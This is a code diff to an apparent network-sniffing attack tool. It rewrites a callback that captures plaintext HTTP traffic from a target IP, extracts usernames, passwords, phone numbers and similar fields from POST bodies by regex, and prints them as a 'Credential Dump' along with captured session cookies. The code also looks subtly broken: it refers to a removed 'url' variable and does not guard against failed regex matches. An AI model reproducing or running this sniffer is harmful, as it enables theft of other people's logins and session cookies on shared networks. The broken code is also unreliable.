@@ -78,36 +78,30 @@ class Device:
                         except Exception:
                             pass
 
+                    # Enhanced credentials recognition (login forms, user_id, etc.)
                     if "POST" in raw_data:
-                        # Look for multiple login-related fields (including new ones like 'heslo', 'passwd', 'pwd', etc.)
-                        login_field_keywords = ['username', 'user', 'login', 'email']
-                        password_field_keywords = ['password', 'pass', 'pwd', 'heslo', 'passwd', 'user_id', 'pseudonym', 'phone']
+                        credentials = {}
+                        for key in ['username', 'user', 'login', 'email']:
+                            if key in raw_data.lower():
+                                credentials['username'] = re.search(rf"{key}=[^&]+", raw_data).group(0).split('=')[1]
+                        for key in ['password', 'pass', 'pwd']:
+                            if key in raw_data.lower():
+                                credentials['password'] = re.search(rf"{key}=[^&]+", raw_data).group(0).split('=')[1]
+                        # Additional form fields (user_id, pseudonym, phone, etc.)
+                        for key in ['user_id', 'pseudonym', 'heslo', 'passwd', 'phone']:
+                            if key in raw_data.lower():
+                                credentials[key] = re.search(rf"{key}=[^&]+", raw_data).group(0).split('=')[1]
 
-                        login_data = None
-                        password_data = None
+                        # If credentials are found, print them in green
+                        if 'username' in credentials and 'password' in credentials:
+                            print(f"\n{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
+                            print(f"{Fore.GREEN}IP: {self.targetip} > LOGIN: {credentials['username']} PWD: {credentials['password']} SITE: {url}{Style.RESET_ALL}")
+                            print(f"{Fore.GREEN}CONTENT: {raw_data.replace('\r\n', ' ')}{Style.RESET_ALL}")
 
-                        # Check if the POST data contains a username and password
-                        for line in raw_data.split('\r\n'):
-                            # Looking for login field
-                            for keyword in login_field_keywords:
-                                if keyword in line.lower():
-                                    login_data = line.split('=')[1] if '=' in line else None
-                            # Looking for password field
-                            for keyword in password_field_keywords:
-                                if keyword in line.lower():
-                                    password_data = line.split('=')[1] if '=' in line else None
-
-                        if login_data and password_data:
-                            # Format and print the captured credentials
-                            url = f"http://{host}{path}"
-                            print(f"{Fore.GREEN}Credential Dump:{Style.RESET_ALL}")
-                            print(f"    IP: {self.targetip} > LOGIN: {login_data} PWD: {password_data} SITE: {url}")
-                            print(f"    CONTENT: raw_username={login_data}&raw_password={password_data}&(place: {path})-(raw ex: submit-button=Login)")
-
-                # Capture cookies if any
-                if "Set-Cookie:" in raw_data:
-                    cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
-                    print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
+                    # Capture cookies
+                    if "Set-Cookie:" in raw_data:
+                        cookies = raw_data.split("Set-Cookie: ")[1].split("\r\n")[0]
+                        print(f"{Fore.GREEN}Captured Cookie: {cookies}{Style.RESET_ALL}")
 
         sniff(iface=self.iface, prn=http_pkt_callback,
               filter=f'tcp port 80 and host {self.targetip}', store=0)
